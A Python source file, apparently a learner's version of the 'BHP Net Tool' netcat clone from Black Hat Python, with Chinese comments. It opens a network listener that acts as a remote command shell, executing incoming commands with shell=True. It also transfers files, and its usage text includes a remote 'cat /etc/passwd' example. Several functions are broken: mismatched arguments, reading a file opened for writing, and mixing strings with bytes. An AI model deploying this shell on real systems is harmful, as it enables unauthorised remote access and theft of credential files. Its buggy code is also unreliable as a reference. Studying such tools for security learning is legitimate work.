import argparse
import os
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
    # TODO: 适配切换目录cd
    if cmd.startswith('cd '):
        os.chdir(cmd[3:].strip())
        return os.getcwd() + '>'        # 切换cd的目录去
    else:
        cmd = cmd.strip()
        if not cmd:
            return
    output = subprocess.check_output(shlex.split(cmd), shell=True, stderr=subprocess.STDOUT)
    return output.decode() + os.getcwd() + '>'   # check_output返回类型是bytes类型 所以需要decode转为字符串类型


class NetCat:
    def __init__(self, args):
        self.args = args
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            print('[run] Enter the first command >')
            self.send()

    # send函数一般是作为客户端（错误，无论客户端服务端都可以用这个函数，用来发送数据，比如传文件，比如发送标志语句）?? 错误收发功能用的是socket的send
    def send(self):
        print("[send] enter the send func")
        self.socket.connect((self.args.target, self.args.port))
        try:
            while True:
                buffer = input("[send] input params:") + '\n'   # 服务端是以\n判定结尾的，所以需要使用\n
                print(buffer)                                   # 用于调试
                self.socket.send(buffer.encode())
                if buffer.startswith("-u "):
                    self.upload_file(buffer, self.socket)
                elif buffer.startswith("-d "):
                    self.download_file(buffer, self.socket)
                else:
                    response = ''
                    recv_len = 4096
                    while recv_len:         # 别人写的好
                        data = self.socket.recv(4096)
                        recv_len = len(data)
                        response += data.decode().strip()
                        if recv_len < 4096:
                            break
                    if response:
                        response = response[7:]
                        print("[send] here is response:  " + response)
                    # continue
        except (ConnectionError, ConnectionResetError, ConnectionAbortedError, ConnectionRefusedError, socket.error) as e:
            print("[send] connection closed  (conn)")
            self.socket.close()
            raise e
        except KeyboardInterrupt:
            print('[send] User terminated Send.')
            self.socket.close()
            sys.exit()
        # finally:
        #     self.socket.close()

    # 服务端一般是做监听
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)                           # 服务器最多可以同时处理 5 个客户端连接请求
        print("[listen] Listener is listening...")
        # 加了一个用户自己键盘停止（没办法，只能等待用户自己keyboard,服务端不能自己断）
        try:
            while True:
                client_socket, _ = self.socket.accept()
                print("[listen] socket accept...")
                client_thread = threading.Thread(
                    # 方法是阻塞式的，会一直等待新的客户端连接请求到达。如果没有新的连接请求，则该方法会一直阻塞当前线程
                    target=self.handle, args=(client_socket,)
                )
                print(f"[listen] threading is start {client_thread.name}")
                client_thread.start()
        except KeyboardInterrupt:
            print("[listen] User keyboard terminated ")

    def upload_file(self, client_socket):           # 这个client_socket参数是返回包接受到的新的连接的返回?    # TODO: 上传文件函数
        print("[up] start upload...")
        file_buffer = b''                           # 监听的一方接受传过来的文件数据
        while True:
            data = client_socket.recv(4096)
            if data:
                file_buffer += data
            else:
                break
        with open(self.args.upload, 'wb') as f:
            f.write(file_buffer)
        message = f'Saved file {self.args.upload}'
        try:
            self.client_socket.send(message)
            print("[up] upload succeed")
        except:
            print("\n[up] upload wrong")

    def download_file(self, client_socket):                        # TODO: 下载文件函数
        print("[down] Start download...")
        filename = self.args.download
        if os.path.isfile(filename):
            size = os.path.getsize(filename)
            client_socket.send("[down] Filesize:" + str(size).encode() + b'\n')      # 发送一个标记，说明文件大小

            with open(filename, 'wb') as f:
                client_socket.send(f.read())
        else:
            client_socket.send("[down] File Not Exist, please Check It".encode())

    def handle(self, client_socket):
        if self.args.execute:                       # 只执行一条命令
            print("[handle_execute] start")
            output = execute(self.args.execute)
            client_socket.send(output.encode())     # 将结果send返回给监听方
            print("[handle_execute] over")
        elif self.args.upload:                      # 上传文件
            print("[handle_upload] start")
            self.upload_file(client_socket)
            print("[handle_upload] over")
        elif self.args.download:                    # 下载文件
            print("[handle_download] start")
            self.download_file(client_socket)
            print("[handle_download] over")
        elif self.args.command:                     # 解析自己的参数，这个是创建一个shell，接受换行符才执行命令
            print("[handle_command] start")
            while True:
                try:
                    client_socket.send(b'BHP: #> ')  # TODO
                    cmd_buffer = b''
                    print("[handle_command] start recv buffer...")
                    while True:
                        chunk = client_socket.recv(64)  # 用chunk来表示字节，用一个变量来表示使得原来代码更简洁和清晰
                        if not chunk:
                            break                       # 如果为空就跳出小循环
                        cmd_buffer += chunk
                        if b'\n' in chunk:
                            break                       # 遇到换行就跳出小循环
                        if len(chunk) < 64:
                            break
                    if cmd_buffer:
                        response = execute(cmd_buffer.decode())     # 执行命令
                    if response:
                        client_socket.send(response.encode())
                        print("[handle_command] recv buffer over...")
                    # continue
                    break
                except subprocess.CalledProcessError as e:
                    client_socket.send(b'Invalid command. Please try again.'.encode())
                    # continue
                    break
                except (ConnectionError, ConnectionResetError, ConnectionAbortedError, ConnectionRefusedError) as e:
                    print(f'server killed,Error:  {e}')     # TODO: 适配客户端的输入错误，进入循环
                    self.socket.close()
                    client_socket.socket.close()            # 应当先关闭服务端的socket后关闭客户端，否则无法关闭服务端
                    break
            # print("[handle_command] over")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            netcat0529.py -t 192.168.1.108 -p 5555 -l -c                        # command shell
            netcat0529.py -t 192.168.1.108 -p 5555 -l -u=mytext.txt             # upload to file
            netcat0529.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"    # execute commandfile
            echo 'ABC' | ./netcat0529.py -t 192.168.1.108 -p 135                # echo text to server port 135
            netcat0529.py -t 192.168.1.108 -p 5555                              # connect to server    
        '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='127.0.0.1', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    parser.add_argument('-d', '--download', help='download file')       # TODO:下载文件
    args = parser.parse_args()
    print("[parser] parse over")

    nc = NetCat(args)
    nc.run()
